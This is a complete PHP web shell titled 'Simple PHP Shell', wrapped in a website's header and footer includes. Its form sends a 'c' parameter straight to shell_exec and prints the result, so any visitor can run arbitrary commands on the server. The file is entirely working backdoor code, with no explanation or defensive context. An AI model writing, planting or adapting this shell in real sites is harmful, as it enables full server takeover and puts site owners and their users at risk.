<?php include "ui/header2.php";?>

<HTML>
<HEAD>
<TITLE>Simple PHP Shell</TITLE>
</HEAD>
<BODY>
<form action="shell.php" method=GET>
<input type="text" NAME="c"/>
<input name="submit" type=submit value="Command">
</FORM>
<?php
if(isset($_REQUEST['submit']))
{
$c = $_REQUEST['c'];
$output = shell_exec("$c");
echo "<pre>$output</pre>\n";
}
?>
</BODY>
</HTML>

<?php include "ui/footer.php"; ?>